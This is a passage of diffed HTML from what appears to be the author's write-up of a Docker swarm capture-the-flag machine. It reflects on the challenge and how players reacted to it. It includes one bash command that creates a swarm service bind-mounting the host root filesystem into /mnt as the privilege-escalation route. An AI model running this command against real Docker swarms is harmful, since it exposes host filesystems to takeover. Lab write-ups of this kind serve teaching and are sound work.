+</span></span></code></pre></div><p>This method is much more targeted, which, depending on the situation, might be preferable.</p>
+<h1 id="closing-thoughts">Closing Thoughts</h1>
+<p>While building this box I found a lot of interesting vectors when it comes to Docker swarm, and I am eager to showcase a few of them in future machines.
+Two parts of this specific vector were very interesting to me: the first is that if you are not careful, you could pwn yourself, which is exactly what happened to me when I was initially testing my creation.</p>
+<p>When running the service-creation command of the initial method, shown below, if I were to specify the remote registry via its external IP address or domain name, it would actually create the service on the target node but with my own root filesystem mounted in <code>/mnt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service create -d -p 1337:1337 --name pwnpod --replicas <span style="color:#ae81ff">2</span> --mount type<span style="color:#f92672">=</span>bind,source<span style="color:#f92672">=</span>/,target<span style="color:#f92672">=</span>/mnt swarm.htb:5000/pwnpod:latest
+</span></span></code></pre></div><p>Only by specifying <code>localhost:5000</code> or adding a <code>--constraint</code> flag to pinpoint the target machine(s), is this avoided.</p>
+<p>Finally, I was quite surprised by the reactions I saw on the Discord server; I must say, a small part of me takes pride in having created a puzzle that stirred up such a <em>swarm</em> of emotions&hellip;</p>
+<p>I hope you still found joy in beating this challenge and that the path to root was rewarding in the end!</p>
+        </div>
+      </div>
     </div>
-  </div>
-  <div class="row">
-    
   </div>
 </main>
 <footer>
